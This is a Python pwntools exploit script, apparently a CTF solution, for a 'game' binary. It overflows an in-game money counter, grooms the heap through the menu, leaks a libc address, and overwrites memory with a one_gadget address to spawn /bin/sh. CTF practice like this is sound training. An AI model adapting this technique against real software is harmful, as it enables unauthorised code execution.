from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('game')
# io = remote('node4.buuoj.cn', 26888)
libc = ELF('/mnt/hgfs/payoung/Documents/ctf/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')
elf = ELF('game')
'''
0x45226 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf03a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1247 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

def work():
    io.sendlineafter('>> ', '1')
    io.sendlineafter('>> ', '2')


def buy(Type):
    io.sendlineafter('>> ', '2')
    io.sendlineafter('>> ', str(Type))


def add():
    io.sendlineafter('>> ', '3')
    io.sendlineafter('>> ', '1')
    io.sendlineafter('A girl came up to talk to you. Did you ignore her?(y or n)', 'n')


def money_overflow():
    io.sendlineafter('>> ', '3')
    io.sendlineafter('>> ', '2')
    io.sendlineafter('>> ', str(0xfff000000100))


def visit(index, Type):
    io.sendlineafter('>> ', '4')
    io.sendlineafter('Please tell who you want to visit?', str(index))
    io.sendlineafter('Do u want to give gifts to her?(y or n)', 'y')
    io.sendlineafter('>> ', str(Type))


def lie_flat(index):
    io.sendlineafter('>> ', '5')
    io.sendlineafter('which one do you want to invite?', str(index))


def pwn():
    io.sendlineafter('name:', 'payoung')
    io.sendlineafter('age:', '20')
    io.sendlineafter('ID:', '0')
    io.sendlineafter('Yes or No (y or n):', 'y')
    # can only 1000 days
    # for _ in range(0x1000):
    #     work()
    for _ in range(125):
        work()
    money_overflow()
    for _ in range(8):
        add()
    for _ in range(10):
        buy(1)
    for _ in range(9):
        add()
    visit(0, 1)
    buy(3)
    lie_flat(7)
    io.recvuntil('NUMB:')
    libc_base = int(io.recvline()[:-1]) - libc.sym['__malloc_hook'] - 0x68
    log.success('libc_base: ' + hex(libc_base))
    one_gadget = libc_base + 0x4527a
    
    visit(0, 1)
    visit(0, 1)
    payload = p64(one_gadget) * 8
    visit(0, 3)
    io.sendlineafter('Please wrote:', payload)
    visit(0, 1)
    visit(0, 2)

    # io.sendlineafter('>> ', '6')
    gdb.attach(io)
    
    pause()
    # io.interactive()


if __name__ == '__main__':
    pwn()

